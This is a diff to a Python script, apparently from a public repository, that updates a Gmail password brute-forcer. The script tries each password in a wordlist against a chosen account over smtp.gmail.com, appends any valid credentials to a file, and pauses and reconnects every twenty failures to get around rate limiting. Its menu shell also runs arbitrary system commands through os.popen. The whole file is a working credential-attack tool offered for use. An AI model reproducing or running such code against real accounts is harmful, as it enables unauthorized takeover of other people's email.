@@ -1,54 +1,45 @@
 '''
-LOL That Tool Was Shit Lol!
-It Was Ma First Tool So !!
-I Will Clean The Code And Find A Way To Close The SMPT Connection After Some Words And Make A new Connection To Brute On LOL
-Maybe There Is Some Problems I Will Solve Every Shit Here
-Have Fun!
-Flag: flag{Hello_From_The_OTHER_SIDE_ROTT} --
+I was about to remove this tool from github. but i decided to fix it and make it work for all cases
+it will take more time here. so if you gonna use this it gonna take sometime.
+
+Flag: flag{Cats_Can_BruteForce_Gmail_Accounts} --
 '''
-import smtplib
-import os
-import sys
-import time
+
+import smtplib , os , sys , time
 
 Count = 0
-def Banner():
-	Up = "\t\t\t\t\t\t --------------------- \n"
-	Middle = "\t\t\t\t\t\t | GmailBruter(V1.2) |\n"
-	Down = "\t\t\t\t\t\t --------------------- "
-	Ban = Up + Middle + Down
-	print(Ban)
+_Count = 0
 
-def StartBruteAccount(Passlist,account,SMTPServer,Count,Time):
+def Banner():
+	Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"; print(Ban)
+
+def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
 	with open('{0}'.format(Passlist),'r') as PasswordsFile:
 		for Password in PasswordsFile:
+			Password = Password.rstrip("\n")
 			try:
 				SMTPServer.login(account,Password)
-				Found = True
-				print("[+] Got Password!")
-				TXTName = input("Enter Name For Data File: ")
-				if TXTName == '': # If There IS NO Name Set Use "Data" For File Name
-					TXTName = "Data"
-				else:
-					pass
-				# Create Data File! 
-				with open('{0}.txt'.format(TXTName),'w') as DataFile:
-					DataFile.write("[+] Email IS: {0}\n".format(account))
-					DataFile.write("[+] Password IS: {0}\n".format(Password))
+				print("[+] Valid Password Has Been Found: {0}".format(Password))
+				
+				# Create Data File!
+				with open('credits.txt' , 'a') as DataFile:
+					DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
 			except smtplib.SMTPAuthenticationError:
-				Count += 1
-				if Count == 10:
-					print("[!] Sleep For {0}".format(Time))
-					time.sleep(Time)
-					Count = 0
-					pass
+				Count += 1; _Count += 1
+				if Count == 20:
+					print("\n[!] Sleeping For {0} Seconds.".format(str(Time))); time.sleep(int(Time)); Count = 0
+					SMTPServer.close()
+
+					SMTPServer = StartSMTPServiceForGmail()
 				else:
-					print("\rCurrent Falied Password: {0} ".format(Password),end="")
-					print("\rCurrent Count: {0} ".format(Count),end="")
+					print("\rBad Password: {0}".format(Password + "   ") , end="")
 					sys.stdout.flush()
-			# except smtplib.SMTPServerDisconnected:
-			#	print("Disconnected")
-			#  It Was Just A Test!
+			except Exception as e:
+				if "please run connect() first" in str(e):
+					SMTPServer.close()
+					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime")
+				else:
+					print("Error: " + str(e))
 
 def StartSMTPServiceForGmail():
 	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
@@ -66,11 +57,12 @@ def HelpGuide():
 	print("\tshow target   --   To Show You Current Target ")
 	print("\tshow time   --   To Show You Current Time ")
 	print("\tshow list   --   To Show You Current List ")
+	print("\tload   --   Load Local Config For Settings")
 	print("\tstart   --   To Start Brute Force Attack\n")
+	print("\texit   --   Close The Shell")
 
 def ContactMe():
-	print("Gmail: mdaif1332@gmail.com")
-	print("Github: https://www.github.com/DEMON1A")
+	Gmail =  "mdaif1332@gmail.com" # Don't Perform The Brute-Force Attacks On My Email.
 
 def StartShell():
 	Commands = []
@@ -82,30 +74,36 @@ def StartShell():
 			Command = Command.rstrip("\n")
 			Commands.append(Command)
 	while True:
-		ShellResponse = input("Command: ")
-		if ShellResponse.lower() not in Commands:
-			print("'{0}' Is Not A Command Here!".format(ShellResponse))
+		ShellResponse = input("root@GmailBruter: ")
+		if ShellResponse.lower().replace(' ' , '') not in Commands:
+			if "s-" in ShellResponse.lower():
+				Command = ShellResponse.split("-"); Command = Command[1]
+				Results = os.popen(Command).read()
+				print("Command:" + Command)
+				print("Results: \n{0}".format(Results))
+			else:
+				print("Can't find the command: '{0}'".format(ShellResponse))
 		elif ShellResponse.lower() == "help":
 			HelpGuide()
-		elif ShellResponse.lower() == "set target":
+		elif ShellResponse.lower().replace(' ' , '') == "settarget":
 			Account = input("Target: ")
-		elif ShellResponse.lower() == "set time":
+		elif ShellResponse.lower().replace(' ' , '') == "settime":
 			Time = input("Time: ")
-		elif ShellResponse.lower() == "set list":
+		elif ShellResponse.lower().replace(' ' , '') == "setlist":
 			PassList = input("List: ")
-		elif ShellResponse.lower() == "show target":
+		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
 			if Account == '':
-				print("[!] No Target Yet!")
+				print("[-] There's no target on the settings")
 			else:
 				print("Target: " + Account)
-		elif ShellResponse.lower() == "show time":
+		elif ShellResponse.lower().replace(' ' , '') == "showtime":
 			if Time == '':
-				print("[!] No Time Yet!")
+				print("[-] There's no time has been set")
 			else:
 				print("Time: " + Time)
-		elif ShellResponse.lower() == "show list":
+		elif ShellResponse.lower().replace(' ' , '') == "showlist":
 			if PassList == '':
-				print("[!] No List Yet!")
+				print("[-] You didn't select a list")
 			else:
 				print("List: " + PassList)
 		elif ShellResponse.lower() == "start":
@@ -121,7 +119,35 @@ def StartShell():
 				print("[!] Set Time!")
 				break
 			else:
-				StartBruteAccount(PassList,Account,Service,Count,Time)
+				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
+		elif ShellResponse.lower() == "exit":
+			exit()
+		elif ShellResponse.lower() == "load":
+			Config = input("Path: ")
+			if os.path.exists(Config):
+				Settings = open(Config , 'r')
+
+				for Line in Settings:
+					Line = Line.rstrip("\n"); Options = Line.split(":")
+
+					try:
+						if Options[0] == "email":
+							Account = Options[1]
+							print("Target: {0}".format(Options[1]))
+						elif Options[0] == "list":
+							PassList = Options[1]
+							print("List: {0}".format(PassList))
+						elif Options[0] == "time":
+							Time = Options[1]
+							print("Time: {0}".format(Time))
+						else:
+							print("[-] Invalid Config. Please check it again.")
+					except Exception:
+						print("[-] Invalid Config. Please check it again.")
+			else:
+				print("[-] The config file you selected doesn't exists")
+		else:
+			pass
 
 # Start
 Banner()
